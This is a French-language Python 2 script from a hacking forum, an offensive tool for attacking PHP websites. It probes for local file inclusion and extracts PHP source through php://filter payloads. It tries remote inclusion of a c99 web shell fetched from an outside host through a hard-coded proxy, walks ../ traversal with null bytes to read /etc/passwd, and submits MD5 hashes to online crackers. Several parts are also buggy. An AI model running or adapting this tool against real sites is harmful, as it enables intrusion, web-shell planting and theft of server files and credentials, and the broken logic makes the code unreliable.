# -*- coding: cp1252 -*-
import urllib, base64, re, webbrowser, random, urllib2, time, socket, httplib, os
from urllib2 import Request,  urlopen,  URLError,  HTTPError
from BeautifulSoup import BeautifulSoup

print """

""""""
 Codé en 2011 par Yacine (Butor) pour la communauté Hack4You et le MOH          

""""""
"""
##def choix():
##  reponse = raw_input("Que voulez-vous faire ?\nTester si le site est vulnérable aux LFI(1)\nRécuperer l source d'un fichier cible(2)\nTenter d'uploader un shell(3)\nTrouvé le etc/passwd(4)  \nChoix 1,2,ou 3 : ")
##  if reponse == "1":
##    print test_url()
##  elif reponse == "2":
##    print php_filter()
##  elif reponse == "3":
##    print shell()
##  elif reponse == "4":
##    print etc()
##  else:
##    print "Erreur, relancer."

def explications_php():
  print "I- Utiliser la fonction phpfiltrers"
  print ""
  print "Mettre le lien sans fichier cible à la fin, exemple : http://www.site.com/index.php?page="
  print "Ensuite, on vous demanderas le fichier cible, c'est à dire le fichier dont vous voulez récuperer la source php. Exemple :"
  print "Fichier cible : index.php"
  print "Selon les sites, le fichier cible demande qu'on mette le .php à la fin, dès fois non. A vous de tester !"
  print "Le programme crée un petit fichier journal qui contient le code source du fichier cible."
  print ""

def testeur_url():
  print "II- Le testeur d'URL "
  print "[Usage example]"
  print ""
  print "Lien à tester : http://www.site.com/index.php?page=articles.php"
  print "Ici, il suffit de mettre le lien en entier, le programme se charge de vérifier si on obtient une erreur, exemple : Warning: include(article.php/) [function.include]: failed to open stream: Not a directory in [...]"
  print ""
  print ""
def general():
  print ""
  print "Notes général :"
  print "- Toujours utiliser http:// ...."
  print "- Cet outil ne fonctionne pas avec des URL réecrite, tels que http://www.example.com/news-about-the-internet/."
  print "  Si vous avez seulement une URL réecrite, essayez de trouver la veritable URL dont les parametres contenus."
  print "[Quelques notes]"
  print "- Tester avec Python 2.6.7."
  print "- Cet outil n'est pas destiné à etre utiliser à de mauvaises fins"
  print "- Je ne suis pas responsable de vos actes"
  print "- Par Butor de Hack4You.eu"
  print ""
def test_shell():
  print ""
  print "III- Test uploadeur de shell"
  print "- En programmation."
  print "- Cree un fichier journal de petite taille."
  print ""
def etcpasswd():
  print ""
  print "IV- Chercher le etc/passwd"
  print "[EXEMPLE]"
  print ""
  print "Lien : http://www.site.com/index.php?page="
  print "Mettre le lien sans fichier cible"
  print "Le programme se charge de trouver le etc/passwd"
  print "Si il le trouve, il créera un fichier journal etc.txt"
  print ""
  print ""

print general()

def test_url():
  print ""
  aide_url = raw_input("Besoin d'aide? Tapez oui\nSinon tapez non : ")
  if aide_url == "oui" or aide_url == "Oui":
    print testeur_url()
  elif aide_url == "non" or aide_url == "Non":
    print "OK" 
  texte = "<b>Warning</b>" or "include"
  test_url = urllib.urlopen(raw_input("Teste d'url : ") + "/")
  found = test_url.read()
  if texte in found:
    print "Vulnérable"
  elif texte not in test_url:
      print "Non vulnérable"
  else:
        print "Erreur"
        time.sleep(2)

def php_filter():
  print ""
  aide = raw_input("Besoin d'aide? Tapez oui\nSinon tapez non : ")
  if aide == "oui" or aide == "Oui":
    print explications_php()
  elif aide == "non" or aide == "Non":
    print "Ok.Relance le prog'"
  site = raw_input("Lien du site : ") #Entrez le lien
  fichier = raw_input("Fichier cible : ") #Fichier à ouvrir
  f = urllib.urlopen(site + "php://filter/read=convert.base64-encode|mcrypt.tripledes/resource="+fichier)
  res = f.read()
  found = re.findall("mcrypt.tripledes\) in <b>.+</b> on line <b>\d+</b><br />.((?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)?)",res,re.M|re.I|re.S)
  #OK: found = re.findall("mcrypt.tripledes\) in <b>.+</b> on line <b>\d+</b><br />.(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)?",res,re.M|re.I|re.S)
  for ligne in found:
    print base64.b64decode(ligne)
    fichier = open("fichier.txt", "w") # Ouvre le fichier.
    fichier.write(base64.b64decode(ligne)) # decode b64 et écriture.
    fichier.close() # Ferme le fichier
    os.startfile("fichier.txt")
    retest = raw_input("Voulez vous tester un autre fichier ? o/n")
    if retest == "o" or retest == "O":
      print phpf()
    elif retest == "n" or retest == "N":
      print "OK."
    else:
      print "Erreur. Relancer le programme"


def shell():
  try:
        site = "http://www.urldetest.com/index.php?page="
        shell = "http://butor.rd-h.com/r.txt?"
        print "\n[+] Target:",site
        print "[+] Starting Scan...\n"
        socket.setdefaulttimeout(20)
        proxy = "201.211.84.133:3128"
        pr = httplib.HTTPConnection(proxy)
        pr.connect()
        proxy_handler = urllib2.ProxyHandler({'http': 'http://'+proxy+'/'})
        proxyfier = urllib2.build_opener(proxy_handler)
        check = proxyfier.open(site+shell)
        lire = proxyfier.open(site+shell).read(-1)
        source = re.findall("c99shell",check)
        print lire
        if len(source) > 0:
          webbrowser.open(site+shell)
        elif (lire.search('<h1>Access forbidden!</h1>')!=-1):
                        print "Erreur :", lire
  except IOError, e:
      
      print e.code
      error = e.read()
      print error
      logs_rfi = open("RFI.log", "w")
      logs_rfi.write(error)
      logs_rfi.close()
        
def etc():
  
  print ""
  aide_etc = raw_input("Besoin d'aide? Tapez --aide\nSinon tapez non : ")
  if aide_etc == "--aide" or aide_etc == "aide":
    print etcpasswd()
  elif aide_etc == "non" or aide_etc == "Non":
    print "OK"
    root = "root"
    c = "../"
    nullbytes = '%00'
    url = raw_input("Url : ")
    destination = "etc/passwd"
    for i in xrange(10):
      tempurl = url + (c * int(i + 1)) + str(destination) +str(nullbytes)
      time.sleep(3)
      s = urllib.urlopen(tempurl)
      resultat = s.read(-1)
      print resultat
      if (resultat.find('root')!=-1):
        trouve = tempurl
        print ""
        print "[TROUVE!]"
        print ""
        ouvrir = raw_input("Voulez vous ouvrir le lien avec votre navigateur ? o/n")
        if ouvrir == "oui" or "o":
          print webbrowser.open(trouve)
        elif ouvrir == "non" or "n":
            txt = open("etcpass_log.txt", "w")
            txt.write("URL : "+ trouve)
            txt.close()
            os.startfile("etcpass_log.txt")

def get_image_link():
    lien = raw_input("Lien: ")
    nav = urllib2.urlopen(lien).read()
    soup = BeautifulSoup(nav)
    for a in soup.findAll('a'):
        if a.has_key('href'):
            iles = a['href']
            print "Fichier: %s" % iles

def decrypt_md5():
    md5 = raw_input("Votre MD5 : ")
    url_params = urllib.urlencode({'term':md5})
    check_md5 = urllib.urlopen("http://md5crack.com/crackmd5.php", url_params)
    lecture = check_md5.read()
    lien = re.compile('Found: md5'+'\S+'+'\s+'+'\S+'+'\s+'+'\w+')
    
    if lien.search(lecture):
        var = lien.search(lecture).group()
        print "Crack en cours...\n[!]Md5 cracké avec md5crack.com"
        print var.strip('[Found,:]')
    else:
        print "Md5 non trouvé sur la base de donnée md5crack.com"


    site = "http://md5.rednoize.com/?p&s=md5&q="
    check_md5 = urllib.urlopen(site+md5)
    lire = check_md5.read(-1)
    if lire == "":
        print "Md5 non trouvé sur la base de donnée de http://md5.rednoize.com/"
    else:
       print "\nCrack en cours...\n[!]Trouvé ! Md5 cracké avec http://md5.rednoize.com/ : "+lire
   

    urlencode =urllib.urlencode({'oc_check_md5':md5})
    f=urllib.urlopen("http://opencrack.hashkiller.com/",urlencode)
    lire=f.read()
    link=re.compile('result'+'.*'+'\S')
    if link.search(lire):
            a= link.search(lire).group()
            print("\nCrack en cours...\n[!]Trouvé ! Md5 cracké avec hashkiller.com")
            print a.strip('[result,",>,<br/>]') 
    else:
            print "\nMd5 non trouvé sur la base de donnée de hashkiller.com\n"



def choix():
  reponse = raw_input("Que voulez-vous faire ?\nTester si le site est vulnérable aux LFI(1)\nRécuperer la source d'un fichier php(2)\nTenter d'uploader un shell(3)\nTrouvé le etc/passwd(4)\nScanné un répertoire web(5)\nCracké un md5(6)  \nChoix 1,2,3,4,5,6 : ")
  if reponse == "1":
    print test_url()
  elif reponse == "2":
      print php_filter()
  elif reponse == "3":
      print shell()
  elif reponse == "4":
      print etc()
  elif reponse == "5":
    print get_image_link()
  elif reponse == "6":
    print decrypt_md5()

print choix()

